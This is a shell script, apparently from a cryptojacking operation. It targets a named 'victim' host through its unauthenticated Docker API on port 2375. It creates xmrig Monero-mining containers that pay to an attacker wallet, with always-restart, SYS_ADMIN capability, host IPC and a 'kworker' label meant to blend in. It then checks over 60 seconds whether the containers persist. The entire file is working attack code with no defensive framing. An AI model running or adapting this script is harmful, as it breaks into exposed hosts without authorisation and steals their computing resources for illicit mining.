#!/bin/sh
# Does a container we create on a victim survive? Watch two bodies for 60s.
#  ktest1 = minimal body, ktest2 = dock.sh's exact body (labels + caps + ipc).
. /tmp/.sysd/worker.env
ip=67.219.98.34
a=$(curl -sS -m 5 "http://$ip:2375/version" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
if [ -n "$a" ]; then u="http://$ip:2375/v$a"; else u="http://$ip:2375"; fi
exec > /tmp/_stick.out 2>&1
echo "ts=$(date -u) ip=$ip api=${a:--} wallet=$(printf '%s' "$WALLET" | cut -c1-8)"
CMDS='"-o","pool.supportxmr.com:443","-u","'"$WALLET"'","-p","node","--no-color","-k","--tls","--cpu-max-threads-hint=100","--huge-pages-jit","--cpu-no-yield"'
A='{"Image":"xmrig/xmrig","Cmd":['"$CMDS"'],"HostConfig":{"RestartPolicy":{"Name":"always"},"CpuShares":2048}}'
B='{"Image":"xmrig/xmrig","Cmd":['"$CMDS"'],"Labels":{"kworker":"1"},"HostConfig":{"RestartPolicy":{"Name":"always"},"CpuShares":2048,"CapAdd":["SYS_ADMIN"],"IpcMode":"host"}}'
for pair in "ktest1 $A" "ktest2 $B"; do
    nm=${pair%% *}
    body=${pair#* }
    r=$(curl -sS -m 25 -X POST -H 'Content-Type: application/json' -d "$body" "$u/containers/create?name=$nm")
    id=$(printf '%s' "$r" | grep -o '"Id":"[0-9a-f]*"' | cut -d'"' -f4)
    echo "-- $nm create=$(date +%T) id=${id:-NONE} raw=$(printf '%s' "$r" | head -c 120)"
    if [ -n "$id" ]; then
        echo "   start=$(date +%T) code=$(curl -sS -o /dev/null -w '%{http_code}' -m 20 -X POST "$u/containers/$id/start")"
    else
        continue
    fi
    for i in 1 2 3 4 5 6; do
        sleep 10
        st=$(curl -sS -m 6 "$u/containers/$id/json" 2>/dev/null | grep -o '"Status": *"[a-z]*"' | head -1)
        inlist=$(curl -sS -m 6 "$u/containers/json?all=1" 2>/dev/null | grep -o '"/'$nm'"' | head -1)
        echo "   $(date +%T) status=${st:-GONE} in_list=${inlist:-no}"
    done
done
echo "done=$(date -u)"
